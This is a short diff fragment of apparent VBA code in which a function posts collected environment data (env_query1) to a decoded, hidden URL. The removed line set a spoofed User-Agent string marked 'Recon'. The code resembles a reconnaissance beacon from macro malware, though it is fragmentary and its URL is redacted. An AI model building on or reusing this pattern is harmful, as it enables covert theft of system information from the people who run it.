@@ -18,7 +18,6 @@ Function env_query() As String
 	
 	URL = decode("[URL]")
 	env_query2.Open "POST", URL, False
-		env_query2.setRequestHeader "User-Agent", decode("{[Mozilla/4.0 (compatible; Recon MSIE 6.0; Windows NT 5.0)"]})
 	env_query2.send(env_query1)
 End Function
 
